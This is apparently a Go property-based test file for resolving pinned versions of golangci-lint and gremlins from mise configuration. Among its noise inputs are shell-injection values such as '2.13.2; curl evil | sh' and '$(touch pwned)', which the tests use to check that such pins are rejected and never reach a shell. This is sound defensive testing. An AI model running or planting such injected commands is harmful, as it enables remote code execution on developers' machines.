package main

import (
	"fmt"
	"math/big"
	"regexp"
	"slices"
	"strings"
	"testing"

	"pgregory.net/rapid"
)

func exactModel(s string) bool {
	parts := strings.Split(strings.TrimPrefix(s, "v"), ".")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if p == "" {
			return false
		}
		for i := 0; i < len(p); i++ {
			if p[i] < '0' || p[i] > '9' {
				return false
			}
		}
	}
	return true
}

func bigParts(v string) [3]*big.Int {
	var out [3]*big.Int
	for i, p := range strings.Split(strings.TrimPrefix(v, "v"), ".") {
		out[i], _ = new(big.Int).SetString(p, 10)
	}
	return out
}

func modelCompare(a, b string) int {
	pa, pb := bigParts(a), bigParts(b)
	for i := range 3 {
		if c := pa[i].Cmp(pb[i]); c != 0 {
			return c
		}
	}
	return 0
}

var componentGen = rapid.OneOf(
	rapid.StringMatching(`0{0,2}[0-9]{1,2}`),
	rapid.SampledFrom([]string{"2", "3", "13", "12", "14", "1", "0", "5", "6", "7", "99999999999999999999"}),
	rapid.StringMatching(`[1-9][0-9]{18,24}`),
)

func versionGen(withV bool) *rapid.Generator[string] {
	return rapid.Custom(func(t *rapid.T) string {
		v := ""
		if withV && rapid.Bool().Draw(t, "v") {
			v = "v"
		}
		return v + componentGen.Draw(t, "x") + "." + componentGen.Draw(t, "y") + "." + componentGen.Draw(t, "z")
	})
}

var noisePin = rapid.OneOf(
	rapid.StringOfN(rapid.SampledFrom([]rune("v0123456789.-+ \n٣a$();")), 0, 14, -1),
	rapid.SampledFrom([]string{"latest", "2", "2.13", "^2.13.2", "~0.6.0", "2.13.2-rc1", "2.13.2+meta", "vv2.13.2", "2.13.2\n", " 2.13.2", "2.13.2; curl evil | sh", "$(touch pwned)", "prefix:2.13.2", "2.13.2.0", ""}),
)

func TestPinShapeIsTotal(t *testing.T) {
	rapid.Check(t, func(t *rapid.T) {
		s := rapid.OneOf(versionGen(true), noisePin).Draw(t, "pin")
		if got, want := isExact(s), exactModel(s); got != want {
			t.Fatalf("isExact(%q) = %v, want %v; a loose pin accepted as exact lets local and CI resolve different versions", s, got, want)
		}
	})
}

func canonical(t *rapid.T, label string) string {
	return rapid.Custom(func(t *rapid.T) string {
		n := rapid.SliceOfN(rapid.IntRange(0, 20), 3, 3).Draw(t, "n")
		v := ""
		if rapid.Bool().Draw(t, "v") {
			v = "v"
		}
		return fmt.Sprintf("%s%d.%d.%d", v, n[0], n[1], n[2])
	}).Draw(t, label)
}

func TestVersionComparisonIsTotalAndConsistent(t *testing.T) {
	rapid.Check(t, func(t *rapid.T) {
		a := versionGen(true).Draw(t, "a")
		b := versionGen(true).Draw(t, "b")
		if rapid.Bool().Draw(t, "related") {
			b = strings.TrimPrefix(a, "v")
			if rapid.Bool().Draw(t, "addV") {
				b = "v" + b
			}
			if rapid.Bool().Draw(t, "pad") {
				b = strings.Replace(b, ".", ".0", 1)
			}
		}
		got := compareVersions(a, b)
		if want := modelCompare(a, b); got != want {
			t.Fatalf("compareVersions(%q, %q) = %d, want %d by numeric order of each component", a, b, got, want)
		}
		if back := compareVersions(b, a); back != -got {
			t.Fatalf("compareVersions not antisymmetric: (%q,%q)=%d, (%q,%q)=%d", a, b, got, b, a, back)
		}
		if sameVersion(a, b) != (got == 0) {
			t.Fatalf("sameVersion(%q, %q) = %v disagrees with compareVersions = %d", a, b, sameVersion(a, b), got)
		}

		p, f := canonical(t, "pinned"), canonical(t, "found")
		if rapid.Bool().Draw(t, "equal") {
			f = strings.TrimPrefix(p, "v")
			if rapid.Bool().Draw(t, "foundV") {
				f = "v" + f
			}
		}
		if want := strings.TrimPrefix(p, "v") == strings.TrimPrefix(f, "v"); sameVersion(p, f) != want {
			t.Fatalf("sameVersion(%q, %q) = %v, want %v: the found binary matches the pin exactly when the versions are equal after dropping a leading v", p, f, !want, want)
		}
		junk := noisePin.Filter(func(s string) bool { return !exactModel(s) }).Draw(t, "junk")
		if sameVersion(p, junk) || sameVersion(junk, p) {
			t.Fatalf("sameVersion accepted unreadable version %q; a binary printing dev or a prerelease must not pass the pin check", junk)
		}
	})
}

var specTools = map[string]struct {
	def, lo, hi, belowLo, belowHi string
	keys                          []string
}{
	"golangci-lint": {"2.13.2", "2.13.2", "3.0.0", "2.13.1", "2.99999999999999999999.99999999999999999999", []string{"golangci-lint", "aqua:golangci/golangci-lint"}},
	"gremlins":      {"0.6.0", "0.6.0", "0.7.0", "0.5.99999999999999999999", "0.6.99999999999999999999", []string{"go:github.com/go-gremlins/gremlins/cmd/gremlins"}},
}

func TestSupportedRange(t *testing.T) {
	if len(pinnedTools) != len(specTools) {
		t.Fatalf("pinnedTools has %d tools, spec names %d", len(pinnedTools), len(specTools))
	}
	for _, tool := range pinnedTools {
		s, ok := specTools[tool.name]
		if !ok || tool.def != s.def || !slices.Equal(tool.keys, s.keys) {
			t.Fatalf("%s: default %q keys %v, want %q %v; the default is what CI installs when no pin exists", tool.name, tool.def, tool.keys, s.def, s.keys)
		}
		for v, want := range map[string]bool{s.lo: true, s.belowLo: false, s.belowHi: true, s.hi: false, s.def: true, "v" + s.lo: true} {
			if tool.inRange(v) != want {
				t.Errorf("%s.inRange(%q) = %v, want %v; the range is the versions whose output the parsers were built against", tool.name, v, !want, want)
			}
		}
	}
	rapid.Check(t, func(t *rapid.T) {
		tool := rapid.SampledFrom(pinnedTools).Draw(t, "tool")
		s := specTools[tool.name]
		v := versionGen(true).Draw(t, "v")
		want := modelCompare(v, s.lo) >= 0 && modelCompare(v, s.hi) < 0
		if got := tool.inRange(v); got != want {
			t.Fatalf("%s.inRange(%q) = %v, want %v for [%s, %s)", tool.name, v, got, want, s.lo, s.hi)
		}
		junk := noisePin.Filter(func(s string) bool { return !exactModel(s) }).Draw(t, "junk")
		if tool.inRange(junk) {
			t.Fatalf("%s.inRange(%q) = true for a non-exact version", tool.name, junk)
		}
	})
}

const probeTop = "/work/repo"

var (
	inRepoFiles  = []string{"mise.toml", ".mise.toml", "sub/mise.toml", ".config/mise.toml", "mise.local.toml", ".tool-versions"}
	outsideFiles = []string{"/home/u/.config/mise/config.toml", "/work/repo-other/mise.toml", "/work/mise.toml"}
	probeKeys    = []string{"golangci-lint", "aqua:golangci/golangci-lint", "go:github.com/go-gremlins/gremlins/cmd/gremlins", "asdf:golangci-lint", "gremlins", "go", "go:github.com/go-gremlins/gremlins"}
)

var probeGen = rapid.Custom(func(t *rapid.T) probe {
	p := probe{top: probeTop, tracked: map[string]bool{}}
	for _, f := range inRepoFiles {
		if rapid.Bool().Draw(t, "tracked "+f) {
			p.tracked[f] = true
		}
	}
	p.trackedConfigs = rapid.SliceOfNDistinct(rapid.SampledFrom(miseConfigNames), 0, 2, rapid.ID).Draw(t, "trackedConfigs")
	switch rapid.IntRange(0, 5).Draw(t, "mise") {
	case 0:
		p.miseAbsent = true
		return p
	case 1:
		p.miseErr = "mise ls --json --local failed: " + rapid.StringMatching(`[a-z ]{1,10}`).Draw(t, "stderr")
		return p
	}
	pathGen := rapid.OneOf(
		rapid.Map(rapid.SampledFrom(inRepoFiles), func(f string) string { return probeTop + "/" + f }),
		rapid.SampledFrom(outsideFiles),
		rapid.Just(""),
	)
	p.mise = map[string][]miseEntry{}
	for _, k := range probeKeys {
		for range rapid.IntRange(0, 2).Draw(t, "n "+k) {
			p.mise[k] = append(p.mise[k], miseEntry{
				RequestedVersion: rapid.OneOf(versionGen(true), noisePin).Draw(t, "pin"),
				Source:           miseSource{Type: "mise.toml", Path: pathGen.Draw(t, "path")},
			})
		}
	}
	if rapid.Bool().Draw(t, "plant") {
		f := rapid.SampledFrom(inRepoFiles).Draw(t, "plantFile")
		p.tracked[f] = true
		p.mise[rapid.SampledFrom(probeKeys[:3]).Draw(t, "plantKey")] = []miseEntry{{
			RequestedVersion: rapid.SampledFrom([]string{"2.13.2", "v2.13.2", "2.14.0", "2.999.0", "0.6.0", "v0.6.3", "0.6.99"}).Draw(t, "plantPin"),
			Source:           miseSource{Type: "mise.toml", Path: probeTop + "/" + f},
		}}
	}
	return p
})

type expectation struct {
	res     resolved
	mention []string
	anyOf   []string
}

type cand struct{ key, pin, rel string }

func inRepoPins(p probe, keys []string) (cands []cand, untracked []string) {
	for _, k := range keys {
		for _, e := range p.mise[k] {
			rel, inside := strings.CutPrefix(e.Source.Path, probeTop+"/")
			if e.Source.Path == "" || !inside {
				continue
			}
			if !p.tracked[rel] {
				untracked = append(untracked, rel)
				continue
			}
			if c := (cand{k, e.RequestedVersion, rel}); !slices.Contains(cands, c) {
				cands = append(cands, c)
			}
		}
	}
	return cands, untracked
}

func expect(p probe, name string) expectation {
	s := specTools[name]
	fail := func(mention []string, anyOf []string) expectation {
		return expectation{mention: append([]string{name}, mention...), anyOf: anyOf}
	}
	if p.miseAbsent && len(p.trackedConfigs) > 0 {
		return fail([]string{"install mise"}, nil)
	}
	if p.miseErr != "" {
		return fail([]string{p.miseErr}, nil)
	}
	cands, untracked := inRepoPins(p, s.keys)
	switch {
	case len(untracked) > 0:
		return fail([]string{"CI would not see it"}, untracked)
	case len(cands) == 0:
		return expectation{res: resolved{name: name, version: s.def, pinnedBy: "default", install: map[string]string{
			"golangci-lint": `curl -sSfL https://golangci-lint.run/install.sh | sh -s -- -b "$(go env GOPATH)/bin" v2.13.2`,
			"gremlins":      "go install github.com/go-gremlins/gremlins/cmd/gremlins@v0.6.0",
		}[name]}}
	case len(cands) > 1:
		var m []string
		for _, c := range cands {
			m = append(m, c.key, c.rel)
		}
		return fail(m, nil)
	}
	c := cands[0]
	if !exactModel(c.pin) {
		return fail([]string{c.rel, s.def}, nil)
	}
	v := strings.TrimPrefix(c.pin, "v")
	if modelCompare(v, s.lo) < 0 || modelCompare(v, s.hi) >= 0 {
		return fail([]string{c.rel, v, s.lo, s.hi}, nil)
	}
	return expectation{res: resolved{name: name, version: v, pinnedBy: c.rel, key: c.key, install: "mise install " + c.key + "@" + v}}
}

func TestResolveFollowsPinPrecedence(t *testing.T) {
	rapid.Check(t, func(t *rapid.T) {
		p := probeGen.Draw(t, "probe")
		rs := resolve(p)
		if len(rs) != len(pinnedTools) {
			t.Fatalf("resolve returned %d resolutions, want one per pinned tool", len(rs))
		}
		for _, r := range rs {
			want := expect(p, r.tool.name)
			if want.res.name != "" {
				if r.problem != "" || r.res != want.res {
					t.Fatalf("%s: got %+v problem %q, want %+v; a tracked in-repo pin wins, otherwise the compiled default", r.tool.name, r.res, r.problem, want.res)
				}
				continue
			}
			if r.problem == "" || r.res != (resolved{}) {
				t.Fatalf("%s: got %+v problem %q, want a failure mentioning %v; a failed resolution must not fall through to the default", r.tool.name, r.res, r.problem, want.mention)
			}
			for _, m := range want.mention {
				if !strings.Contains(r.problem, m) {
					t.Fatalf("%s: problem %q does not mention %q", r.tool.name, r.problem, m)
				}
			}
			if len(want.anyOf) > 0 && !slices.ContainsFunc(want.anyOf, func(f string) bool { return strings.Contains(r.problem, f) }) {
				t.Fatalf("%s: problem %q names none of the untracked files %v", r.tool.name, r.problem, want.anyOf)
			}
		}
	})
}

var installTemplates = map[string]*regexp.Regexp{
	"golangci-lint": regexp.MustCompile(`^(?:mise install (?:golangci-lint|aqua:golangci/golangci-lint)@([0-9]+\.[0-9]+\.[0-9]+)|curl -sSfL https://golangci-lint\.run/install\.sh \| sh -s -- -b "\$\(go env GOPATH\)/bin" v([0-9]+\.[0-9]+\.[0-9]+))$`),
	"gremlins":      regexp.MustCompile(`^(?:mise install go:github\.com/go-gremlins/gremlins/cmd/gremlins@([0-9]+\.[0-9]+\.[0-9]+)|go install github\.com/go-gremlins/gremlins/cmd/gremlins@v([0-9]+\.[0-9]+\.[0-9]+))$`),
}

func TestInstallLinesCarryNoRepositoryText(t *testing.T) {
	rapid.Check(t, func(t *rapid.T) {
		for _, r := range resolve(probeGen.Draw(t, "probe")) {
			if r.problem != "" {
				continue
			}
			m := installTemplates[r.tool.name].FindStringSubmatch(r.res.install)
			if m == nil {
				t.Fatalf("%s: install %q is not a fixed template; anything else would pipe repository text into a shell", r.tool.name, r.res.install)
			}
			if v := m[1] + m[2]; v != r.res.version {
				t.Fatalf("%s: install %q installs %q, resolved version is %q", r.tool.name, r.res.install, v, r.res.version)
			}
		}
	})
}
